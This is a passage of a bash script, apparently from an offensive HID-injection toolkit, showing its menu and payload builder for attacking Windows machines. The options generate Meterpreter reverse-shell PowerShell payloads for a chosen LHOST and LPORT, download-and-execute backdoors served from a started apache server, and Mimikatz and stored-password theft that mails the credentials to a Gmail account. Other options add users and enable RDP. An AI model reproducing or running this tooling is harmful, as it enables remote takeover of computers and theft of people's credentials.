echo -e $BlueF"	[$white"01"$BlueF]$cyan  Meterpreter Reverse TCP Injection using Powershell  "
echo -e $BlueF"	[$white"02"$BlueF]$cyan  Download and Execute Backdoor  "
echo -e $BlueF"	[$white"03"$BlueF]$cyan  Get Credential information With Mimikatz [ Send to gmail ]    "
echo -e $BlueF"	[$white"04"$BlueF]$cyan  Retrieve lots of passwords stored on a local computer [ gmail ]  "
echo -e $BlueF"	[$white"05"$BlueF]$cyan  Payload Prank for attack computer [ Fun with Windows ] "
echo -e $BlueF"	[$white"06"$BlueF]$cyan  Payload to Manage Windows [ add user,rdp enable,telnet ] "
echo -e $BlueF"	[$white"07"$BlueF]$cyan  Attacking Windows [ At your Own Risk ]"
echo -e $BlueF"	[$white"08"$BlueF]$cyan  Help and Tutorials "
echo -e $BlueF"	[$white"09"$BlueF]$cyan  Credits  "
echo -e $BlueF"	[$white"10"$BlueF]$cyan  Exit  "

echo -e " "
echo -n -e $red'  \033[4mScreetsec@Brutal:\033[0m >> '; tput sgr0 #insert your choice
read Dracos
echo -e $white"  --------------------------------------------------------------   ";
		if test $Dracos == '1'
				then
					echo ""
					echo -e $okegreen""
					echo -ne "  SET LHOST : ";tput sgr0
					read yourip
					echo ""
					echo -ne $okegreen " SET LPORT : ";tput sgr0
					read yourport
					echo ""
					payload=$(zenity --list --title "☣ PAYLOAD ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1
					echo ""
					echo ""
					$pwned $payload $yourip $yourport > /dev/null 2>&1
					cat powershell_attack.txt
					echo ""
					s0=$(cat powershell_attack.txt | cut -d ' ' -f5)
					sed s/POWERSHELLATTACK/$s0/g $meinject > $meinjectopt
					sleep 2
					echo ""
					rm powershell_attack.txt unicorn.rc
					echo -e $okegreen " Succes Create Payload "
					echo -e $white"  --------------------------------------------------------------   ";
					echo ""
					echo -e $yellow " Now Copy the generated $meinjectopt to your HID "
					echo ""
		elif test $Dracos == '2'
	 			then
					echo ""
					echo -e $red"  Note : You can upload your backdoor into your server "
					echo -e $okegreen " Wait , starting apache server ...... "
					service apache2 start
					echo ""
					touch $temp
					echo -ne $okegreen"  The Name Your Backdoor : " ; tput sgr0
					read guu
					echo ""
				        echo -ne $okegreen"  Located your file or backdoor ( /var/www/html/Backdoor.exe)  : "
				  read gii
					echo $guu $gii > "$temp"
					s0=$(cat $temp | cut -d ' ' -f1)
					s1=$(cat $temp | cut -d ' ' -f2)
					sed s#NAMABACKDOOR#$s0#g $doxec > $doxecopt
					sed s#LOKASIBACKDOOR#$s1#g $doxecopt >$doxecopt1
					echo ""
					sleep 1
					echo -e $white " Succes Create Payload "
					echo -e $white"  --------------------------------------------------------------   ";
					echo ""
					echo -e $yellow " Now Copy the generated $doxecopt1 to your HID "
					echo ""
			elif test $Dracos == '3'
				then
					echo ""
					echo -e $red"  Note : You must setting your account gmail in : "
					echo -e $yellow"  https://www.google.com/settings/security/lesssecureapps "
					echo ""
					echo -ne $okegreen " Input your email  :  "; tput sgr0
					read put
					echo ""
					echo -ne $okegreen " Input your password :  "; tput sgr0
					read -s pass
					echo ""
					echo ""
					echo -ne $okegreen " File Recieved send to : "; tput sgr0
					read send
					touch $mail
					echo $put $pass $send > "$mail"
					s0=$(cat $mail | cut -d ' ' -f1)
					s1=$(cat $mail | cut -d ' ' -f2)
					s2=$(cat $mail | cut -d ' ' -f3)
					sed s#FROM_SCREETSEC#$s0#g $gathering1 > $gathering1opt
					sed s#PASSWORD_SCREETSEC#$s1#g $gathering1opt > $gathering1opt1
					sed s#KE_SCREETSEC#$s2#g $gathering1opt1 > $gathering1opt2
					sleep 2
					rm $gathering1opt $gathering1opt1
					echo ""
					sleep 1
					echo -e $white " Succes Create Payload "
					echo -e $white"  --------------------------------------------------------------   ";
					echo ""
					echo -e $yellow " Now Copy the generated $gathering1opt2 to your HID "
					echo ""
				elif test $Dracos == '4'
					then
						echo ""
						echo -e $red"  Note : You must setting your account gmail in : "
						echo -e $yellow"  https://www.google.com/settings/security/lesssecureapps "
						echo ""
						echo -ne $okegreen " Input your email  :  "; tput sgr0
						read put
						echo ""
						echo -ne $okegreen " Input your password :  "; tput sgr0
						read -s pass
						echo ""
						echo ""
						echo -ne $okegreen " File Recieved send to : "; tput sgr0
						read send
						touch $mail
						echo $put $pass $send > "$mail"
						s0=$(cat $mail | cut -d ' ' -f1)
						s1=$(cat $mail | cut -d ' ' -f2)
						s2=$(cat $mail | cut -d ' ' -f3)
						sed s#FROM_SCREETSEC#$s0#g $gathering2 > $gathering2opt
						sed s#PASSWORD_SCREETSEC#$s1#g $gathering2opt > $gathering2opt1
						sed s#KE_SCREETSEC#$s2#g $gathering2opt1 > $gathering2opt2
						sleep 2
						rm $gathering2opt $gathering2opt1
						echo ""
						sleep 1
						echo -e $white " Succes Create Payload "
						echo -e $white"  --------------------------------------------------------------   ";
						echo ""
						echo -e $yellow " Now Copy the generated $gathering2opt2 to your HID "
						echo ""

					elif test $Dracos == '5'
			      then
			        clear
			        mprank
					elif test $Dracos = '6'
						then
							clear
							mmanage
						elif test $Dracos = '7'
							then
								clear
								mattack
							elif test $Dracos = '8'
								then
									clear

								elif test $Dracos = '9'
								then
					        clear
									credits
								elif test $Dracos = '10'
								then
					        clear
									exit
				 		else
							echo -e "  Incorrect Number"
							fi
							echo -n -e $red"  Do you want exit? ( Yes / No ) :" ;tput sgr0
							read back
										if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
												then
												clear
												exit
										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
												then
												menu
				fi
